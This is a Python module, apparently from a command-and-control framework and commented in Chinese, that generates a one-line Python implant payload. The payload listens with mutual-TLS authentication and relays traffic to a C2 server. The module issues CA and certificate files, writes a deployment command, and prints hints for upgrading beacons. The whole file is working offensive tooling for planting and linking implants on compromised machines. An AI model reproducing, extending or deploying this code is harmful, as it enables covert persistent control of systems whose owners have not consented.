"""
@module: agent_mtls
@desc: 生成 Agent_mtls 一句话 python 载荷: 植入物 mTLS 连入(双向证书认证), 卸载后 TCP 帧中继到 server
@params: host port [server_key_hex] [out_dir] [agent_id]
"""
import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.s_modules import tls_util
from server.transports.agent_base import relay_code

MODULE = {
    "desc": "生成 Agent_mtls 一句话 python 载荷(mTLS 双向认证中继)",
    "params": [
        ("host", "必填，server 地址"),
        ("port", "必填，server implant 端口"),
        ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
        ("out_dir", "默认 s_modules/output"),
        ("agent_id", "可选；中继标识，转发 register 时 via=agent_mtls:<id>"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

_LISTEN_CODE = '''\
def MTL(c):
 import tempfile as _t,os as _o,ssl as _g
 cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CERT.encode());cf.close()
 kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_KEY.encode());kf.close()
 caf=_t.NamedTemporaryFile(delete=False,suffix=".pem");caf.write(_CAPEM.encode());caf.close()
 try:
  ctx=_g.SSLContext(_g.PROTOCOL_TLS_SERVER)
  ctx.load_cert_chain(cf.name,kf.name)
  ctx.verify_mode=_g.CERT_REQUIRED
  ctx.load_verify_locations(caf.name)
  return ctx.wrap_socket(c,server_side=True)
 finally:
  _o.unlink(cf.name);_o.unlink(kf.name);_o.unlink(caf.name)
def fwd(c):
 u=None
 try:
  u=a.socket();u.settimeout(30);u.connect((_SH,_SP))
  u.sendall(l.token_bytes(256))
  f.Thread(target=a2s,args=(c,u),daemon=True).start()
  s2a(c,u)
 except:pass
 finally:
  try:c.close()
  except:pass
  try:u.close()
  except:pass
def run():
 s=a.socket();s.setsockopt(a.SOL_SOCKET,a.SO_REUSEADDR,1)
 try:s.bind(("0.0.0.0",_LP))
 except Exception as e:print("agent bind failed:",e);return
 s.listen(64)
 while 1:
  try:
   c,_=s.accept()
   try:c=MTL(c)
   except:continue
   f.Thread(target=fwd,args=(c,),daemon=True).start()
  except:pass
run()
'''


def _read_server_key() -> bytes:
    """从 server/config.json 读取 implant_key（agent↔server 用）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
    """生成 Agent_mtls 代码与部署命令（含 CA / server cert / 载荷 client cert）。"""
    port = int(port)
    server_key = None
    if server_key_hex:
        server_key = bytes.fromhex(server_key_hex)
    else:
        server_key = _read_server_key()
        if server_key is None:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。"
                               "请先 s_exec keygen。"}

    agent_key = secrets.token_bytes(32)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    # CA + server 证书(植入物 pin) + 载荷客户端证书(双向认证)
    ca = tls_util.generate_ca(out_dir)
    srv = tls_util.issue_cert(ca, host, out_dir, "agent")
    cli = tls_util.issue_cert(ca, f"implant-{secrets.token_hex(4)}",
                              out_dir, "client")

    listen_port = _pick_listen_port()
    via = f"agent_mtls:{agent_id}" if agent_id else "agent_mtls"
    code = relay_code(str(list(server_key)).replace(" ", ""),
                      str(list(agent_key)).replace(" ", ""),
                      host, port, via, long_lived=True)
    code += _LISTEN_CODE.replace("_CERT", repr(srv["cert_pem"])) \
                        .replace("_KEY", repr(srv["key_pem"])) \
                        .replace("_CAPEM", repr(ca["ca_pem"])) \
                        .replace("_LP", str(listen_port))
    compile(code, "<agent_mtls>", "exec")  # 生成即校验

    # server 证书 DER 指纹(载荷端 pin)
    import hashlib
    import subprocess
    der = subprocess.run(
        ["openssl", "x509", "-in", srv["cert_file"], "-outform", "DER"],
        capture_output=True, timeout=30)
    if der.returncode != 0:
        raise RuntimeError("openssl x509 DER conversion failed")
    server_fingerprint = hashlib.sha256(der.stdout).hexdigest()

    command = deploy_command(code)
    files = {
        "ca": ca["ca_file"],
        "ca_key": ca["ca_key_file"],
        "server_cert": srv["cert_file"],
        "server_key": srv["key_file"],
        "client_cert": cli["cert_file"],
        "client_key": cli["key_file"],
        "xor_key": os.path.join(out_dir, "agent_mtls_key.hex"),
        "command": os.path.join(out_dir, "agent_mtls_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(agent_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "agent_key": agent_key.hex(),
        "server_fingerprint": server_fingerprint,
        "ca_fingerprint": ca["ca_fingerprint"],
        "listen_port": listen_port,
        "deploy": command,
        "code": code,
        "files": files,
        "uplevel_hint": (
            f"载荷升级: s_exec transport_mtls {host} {listen_port} "
            f"{agent_key.hex()} <client_cert> <client_key> <ca_cert> "
            f"{server_fingerprint}\n"
            f"然后: uplevel_mtls <beacon_id> {host} {listen_port} "
            f"{agent_key.hex()} {cli['cert_file']} {cli['key_file']} "
            f"{ca['ca_file']} {server_fingerprint}"
        ),
    }


def _pick_listen_port() -> int:
    """临时端口探测（listen 端口与 server 端口错开）。"""
    s = __import__("socket").socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


if __name__ == "__main__":
    print("usage: s_exec agent_mtls <host> <port> [server_key_hex]")
